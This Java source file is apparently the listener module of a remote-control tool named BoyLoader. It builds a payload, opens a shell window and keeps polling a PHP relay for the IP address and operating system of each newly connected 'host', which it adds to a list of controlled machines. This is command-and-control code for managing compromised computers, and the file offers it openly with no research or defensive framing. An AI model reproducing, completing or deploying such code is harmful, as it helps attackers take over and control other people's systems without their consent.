package net.wind.core.Listening;

import net.wind.BoyLoader;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.List;
import java.util.Properties;
import java.util.Scanner;

import net.wind.core.Config.MakePayload;
import net.wind.utils.HttpUtils;
import net.wind.core.window.getReFreshtime;
import net.wind.core.window.ShellWindow;
import net.wind.core.window.getPhPClient;

/**
 * createTime 2022/11/19 0019
 * fileName ListenMain
 *
 * @author WindStream
 */

public class ListenMain{

    public static String System = null;
    public static int reFreshtime;
    public static void StartListening() throws InterruptedException, IOException {
        BoyLoader.phpClient = getPhPClient.getPhpClient();
        getPhPClient.makesurePhpClient();
        MakePayload.createPayload();
        reFreshtime = getReFreshtime.getRefreshtime();

        ShellWindow.buildShellWindow();
        while(true) {
            Thread.sleep(reFreshtime);
            String Ip = HttpUtils.doGet(BoyLoader.phpClient+"/ServerGetIP.php");
            System = HttpUtils.doGet(BoyLoader.phpClient+"/ServerGetSystem.php?ip="+Ip);
            if(Ip.equals("")){}else {
                BoyLoader.print("New Host Online ---> IP: "+Ip+"   System: " + System);
                if (BoyLoader.Host_List.contains(Ip)){

                }else {
                BoyLoader.Host_List.add(Ip);
            }}
        }

    }
}
